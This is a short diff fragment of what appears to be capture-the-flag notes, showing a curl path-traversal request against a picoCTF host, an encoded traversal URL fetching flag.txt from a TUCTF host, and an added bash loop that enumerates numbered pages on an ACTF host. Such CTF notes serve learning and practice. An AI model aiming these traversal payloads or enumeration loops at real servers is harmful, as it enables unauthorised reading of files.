@@ -10,3 +10,7 @@ curl -X POST "http://saturn.picoctf.net:52472/read.php" -d filename=../../../../
 ```py
 https://vertical-traversal.tuctf.com/get/...%2Fflag.txt
 ```
+
+```py
+for i in $(seq 3000 4000); do curl -s https://directory.web.actf.co/$i.html | grep -v "another file";done
+```
